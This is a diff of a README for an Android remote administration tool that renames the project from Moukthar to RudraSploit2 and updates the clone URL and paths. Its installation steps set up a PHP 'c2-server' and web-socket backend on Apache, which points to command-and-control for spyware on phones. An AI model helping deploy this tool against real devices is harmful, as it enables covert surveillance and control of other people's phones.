@@ -1,4 +1,4 @@
-## Moukthar
+## RudraSploit2
 Remote adminitration tool for android
 
 ### Demo
@@ -21,12 +21,12 @@ Remote adminitration tool for android
 ### Installation
 - Clone repository
   ```console
-  git clone https://github.com/Tomiwa-Ot/moukthar.git
+  git clone https://github.com/iamlalitpandit/RudraSploit2.git
   ```
 - Install php, composer, mysql, php-mysql driver, apache2 and a2enmod
 - Move server files to ```/var/www/html/``` and install dependencies
   ```console
-  mv moukthar/Server/* /var/www/html/
+  mv RudraSploit2/Server/* /var/www/html/
   cd /var/www/html/c2-server
   composer install
   cd /var/www/html/web-socket/
